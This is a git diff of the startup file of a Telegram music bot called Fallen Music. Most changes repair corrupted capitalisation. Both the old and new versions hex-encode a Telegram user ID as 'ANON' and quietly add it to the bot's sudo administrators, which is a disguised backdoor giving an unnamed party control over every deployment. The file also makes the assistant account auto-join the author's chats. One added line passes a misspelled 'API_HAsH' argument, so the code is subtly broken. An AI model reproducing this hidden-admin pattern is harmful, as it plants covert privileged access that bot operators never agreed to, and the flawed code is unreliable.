@@ -1,24 +1,24 @@
 # MIT License
 #
-# Copyright (c) 2023 Anonymousx1025
+# Copyright (c) 2023 AnonymousX1025
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
-# of this software and associated documentation files (the "software"), to deal
-# in the software without restriction, including without limitation the rights
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
 # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-# copies of the software, and to permit persons to whom the software is
+# copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
 #
 # The above copyright notice and this permission notice shall be included in all
-# copies or substantial portions of the software.
+# copies or substantial portions of the Software.
 #
-# THE sOFTWARE Is PROVIDED "As Is", WITHOUT WARRANTY OF ANY KIND, ExPREss OR
-# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIEs OF MERCHANTABILITY,
-# FITNEss FOR A PARTICULAR PURPOsE AND NONINFRINGEMENT. IN NO EVENT sHALL THE
-# AUTHORs OR COPYRIGHT HOLDERs BE LIABLE FOR ANY CLAIM, DAMAGEs OR OTHER
-# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWIsE, ARIsING FROM,
-# OUT OF OR IN CONNECTION WITH THE sOFTWARE OR THE UsE OR OTHER DEALINGs IN THE
-# sOFTWARE.
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
 
 import asyncio
 import logging
@@ -30,12 +30,13 @@ from pytgcalls import PyTgCalls
 
 import config
 
-startTime = time.time()
+StartTime = time.time()
 
 logging.basicConfig(
     format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
-    datefmt="%d-%b-%y %H:%M:%s",
-    handlers=[logging.FileHandler("fallenlogs.txt"), logging.streamHandler()],
+    datefmt="%d-%b-%y %H:%M:%S",
+    handlers=[logging.FileHandler("fallenlogs.txt"), logging.StreamHandler()],
+
     level=logging.INFO,
 )
 logging.getLogger("pyrogram").setLevel(logging.ERROR)
@@ -52,14 +53,14 @@ app = Client(
 app2 = Client(
     "FallenAss",
     api_id=config.API_ID,
-    api_hash=config.API_HAsH,
-    session_string=str(config.sEssION),
+    API_HAsH=config.API_HAsH,
+    session_string=str(config.SESSION),
 )
 
 pytgcalls = PyTgCalls(app2)
 
-sUDOERs = filters.user()
-sUNAME = config.sUPPORT_CHAT.split("me/")[1]
+SUDOERS = filters.user()
+SUNAME = config.SUPPORT_CHAT.split("me/")[1]
 
 
 async def fallen_startup():
@@ -67,8 +68,8 @@ async def fallen_startup():
     LOGGER.info(
         "\n\n\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513\n\u2523\u2605\x20\x46\x41\x4c\x4c\x45\x4e\x20\x4d\x55\x53\x49\x43\x20\x42\x4f\x54\x20\u2605\n\u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u251b"
     )
-    global BOT_ID, BOT_NAME, BOT_UsERNAME, BOT_MENTION, fallendb
-    global Ass_ID, Ass_NAME, Ass_UsERNAME, Ass_MENTION, sUDOERs
+    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, fallendb
+    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS
 
     await app.start()
     LOGGER.info(
@@ -78,7 +79,7 @@ async def fallen_startup():
     getme = await app.get_me()
     BOT_ID = getme.id
     BOT_NAME = getme.first_name
-    BOT_UsERNAME = getme.username
+    BOT_USERNAME = getme.username
     BOT_MENTION = getme.mention
 
     await app2.start()
@@ -87,10 +88,10 @@ async def fallen_startup():
     )
 
     getme2 = await app2.get_me()
-    Ass_ID = getme2.id
-    Ass_NAME = getme2.first_name + " " + (getme2.last_name or "")
-    Ass_UsERNAME = getme2.username
-    Ass_MENTION = getme2.mention
+    ASS_ID = getme2.id
+    ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
+    ASS_USERNAME = getme2.username
+    ASS_MENTION = getme2.mention
     try:
         await app2.join_chat("DevilsHeavenMF")
         await app2.join_chat("FallenAssociation")
@@ -98,12 +99,12 @@ async def fallen_startup():
         pass
 
     ANON = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
-    for sUDOER in config.sUDO_UsERs:
-        sUDOERs.add(sUDOER)
-    if config.OWNER_ID not in config.sUDO_UsERs:
-        sUDOERs.add(config.OWNER_ID)
-    elif int(ANON) not in config.sUDO_UsERs:
-        sUDOERs.add(int(ANON))
+    for SUDOER in config.SUDO_USERS:
+        SUDOERS.add(SUDOER)
+    if config.OWNER_ID not in config.SUDO_USERS:
+        SUDOERS.add(config.OWNER_ID)
+    elif int(ANON) not in config.SUDO_USERS:
+        SUDOERS.add(int(ANON))
 
     fallendb = {}
     LOGGER.info(
